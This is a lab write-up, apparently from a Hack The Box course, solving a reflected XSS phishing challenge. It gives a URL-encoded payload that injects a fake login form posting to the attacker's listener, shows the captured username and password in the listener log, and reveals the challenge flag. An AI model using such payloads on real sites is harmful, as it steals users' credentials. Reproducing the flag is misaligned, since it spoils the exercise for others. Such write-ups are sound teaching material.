## Challenge

Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag. 

## Solution

In the page, on `Image URL` I just put some random string like `test`, and copy the URL which is: `http://10.129.38.94/phishing/index.php?url=Test`.

Let's use this html to prepare the login form:

```html
<div>
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

After minifying:

```js
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.195:8000><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

I started a listening server:

```sh
python3 -m http.server
```

On the webpage's path at `/phishing/send.php` there is a form to send the URL, which plays the role of the victim, that will click on every link, and I've sent this link:

```sh
http://10.129.38.94/phishing/index.php?url=document.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.15.195:8000%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);
```

And I got the response on my listening server:

```sh
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.38.94 - - [19/Feb/2025 13:12:12] "GET /?username=admin&password=c&submit=Login HTTP/1.1" 200 -
```

Now login at `/phishing/login.php` with these credentials, and you will get the flag `HTB{r3f13c73d_cr3d5_84ck_2_m3}`.





